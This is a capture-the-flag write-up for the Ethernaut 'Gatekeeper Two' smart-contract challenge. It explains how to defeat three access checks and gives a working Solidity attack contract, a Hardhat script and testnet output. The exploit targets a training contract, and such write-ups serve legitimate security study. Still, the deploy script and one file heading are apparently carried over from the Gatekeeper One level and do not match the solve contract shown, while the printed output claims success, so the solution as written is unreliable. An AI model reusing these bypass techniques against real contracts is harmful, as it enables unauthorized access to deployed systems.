---
title: "Ethernaut #14 Gatekeeper Two"
tags: [ethernaut]
style: border
color: primary
description: Ethernaut Gatekeeper Two challenge writeup
---

## Gatekeeper Two

### Challenge

This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.

#### Things that might help:

* Remember what you've learned from getting past the first gatekeeper - the first gate is the same.
* The `assembly` keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See [here](http://solidity.readthedocs.io/en/v0.4.23/assembly.html) for more information. The `extcodesize` call in this gate will get the size of a contract's code at a given address - you can learn more about how and when this is set in section 7 of the [yellow paper](https://ethereum.github.io/yellowpaper/paper.pdf).
* The `^` character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see [here](http://solidity.readthedocs.io/en/v0.4.23/miscellaneous.html#cheatsheet)). The Coin Flip level is also a good place to start when approaching this challenge.


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

### Background

This challenge is somewhat similar to `GatekeeperOne`. It mainly has multiple conditions in order that need to be satisfied in order to pass the challenge.

The `extcodesize` bytecode returns (pushes onto the stack) the size of the contract it got as an argument (poped from the stack). According to the [yellow paper](https://ethereum.github.io/yellowpaper/paper.pdf) section 7, page 11, footnote 5, 

> During initialization code execution, EXTCODESIZE on the address should return zero...

This will be very useful in order to bypass the second modifier.

The `keccack` function is the hash function used on the ethereum blockchain.


### Attack

In order to enter, three `modifier`s need to be satisfied, the first require the `msg.sender` and `tx.origin` to be different. This can be achieved using a smart contract to trigger the `enter` function. Then the `extcodesize` needs to return a value of `0`. As discussed already, this can be achieved if the caller code (in this case the attacker controlled contract), is executed during its initialization (`constructor` execution). Finally the last `modifier` requires the a simple `boolean` equation to be satisfied. This operation is very easy to reverse since its just an `XOR` (`^`) operator. 

* Create a contract that calls the `GatekeeperOne` `enter` function during the `constructor` execution
* To calculate the `_gateKey` to provide simply re-arranging the check to `_gateKey = (uint64(0) - 1) ^ uint64(bytes8(keccak256(abi.encodePacked(this)))))`
* Trigger the attacker controlled contract to call the `enter` function

#### GatekeeperOneSolve.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.4;

import '../challenges/GatekeeperTwo.sol';

contract GatekeeperTwoSolve {

    constructor(address payable _gatekeeperTwoAddress) public {
        GatekeeperTwo gatekeeperTwoContrtact = GatekeeperTwo(_gatekeeperTwoAddress);
        bytes8 gateKey = bytes8((uint64(0) - 1) ^ uint64(bytes8(keccak256(abi.encodePacked(this)))));
        gatekeeperTwoContrtact.enter(gateKey);
    }

}
```


#### gatekeeper-two-solve.js

```javascript
const hre = require("hardhat");
const { ethers, upgrades } = require("hardhat");

async function main() {
    gatekeeperOneAddress = "0x24315b9ab5e38cF2F6126F7827D2EB3aC5296b27";
    contract = await ethers.getContractAt("GatekeeperOne", gatekeeperOneAddress);
    
    const accounts = await hre.ethers.getSigners();
    account = accounts[0];
    
    GatekeeperOneSolve = await ethers.getContractFactory("GatekeeperOneSolve");
    gatekeeperOneSolve = await GatekeeperOneSolve.deploy();
    await gatekeeperOneSolve.deployed();

    console.log("Initial entrant: " + await contract.entrant())

    // generate the gate key
    gateKey = ethers.utils.hexZeroPad(ethers.utils.hexConcat([
        "0x01", 
        "0x0000", 
        ethers.utils.hexDataSlice(account.address, 18)
    ]), 8)

    console.log(gateKey)

    // submit the gate key
    tx = await gatekeeperOneSolve.connect(account).enter(contract.address, gateKey)
    receipt = await tx.wait()

    console.log("Entrant        : " + await contract.entrant())
    
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
```

```bash
$ npx hardhat run scripts/gatekeeper-two-solve.js --network rinkeby
Compiled 1 Solidity file successfully
Initial entrant: 0x0000000000000000000000000000000000000000
Entrant        : 0x11bAe9eA1851939a485f1F00b7B0Eec099e9276d
```

### Success Message

Way to go! Now that you can get past the gatekeeper, you have what it takes to join [theCyber](https://etherscan.io/address/thecyber.eth#code), a decentralized club on the Ethereum mainnet. Get a passphrase by contacting the creator on [reddit](https://www.reddit.com/user/0age) or via [email](0age@protonmail.com) and use it to register with the contract at [gatekeepertwo.thecyber.eth](https://etherscan.io/address/gatekeepertwo.thecyber.eth#code) (be aware that only the first 128 entrants will be accepted by the contract).

(unfortunately by the time I was done with this the 128 spots were already filled)
